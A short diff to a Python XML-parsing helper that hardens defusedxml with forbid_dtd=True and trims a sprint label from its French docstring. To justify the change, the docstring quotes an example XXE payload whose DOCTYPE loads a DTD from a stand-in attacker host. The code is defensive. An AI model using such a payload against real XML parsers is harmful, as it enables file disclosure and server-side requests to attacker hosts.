@@ -34,7 +34,7 @@ import defusedxml.ElementTree as _SafeET
 def safe_parse_xml(xml_bytes: bytes) -> Optional[ET.Element]:
     """Parse du XML en bloquant entités externes ET ``<!DOCTYPE>``.
 
-    Sprint S1.4 — durcissement : ``forbid_dtd=True`` ajouté en plus
+    durcissement : ``forbid_dtd=True`` ajouté en plus
     des défauts ``defusedxml`` (``forbid_entities=True``,
     ``forbid_external=True``).  Sans ``forbid_dtd``, un payload
     ``<?xml...?><!DOCTYPE root SYSTEM "http://attacker/evil.dtd">``
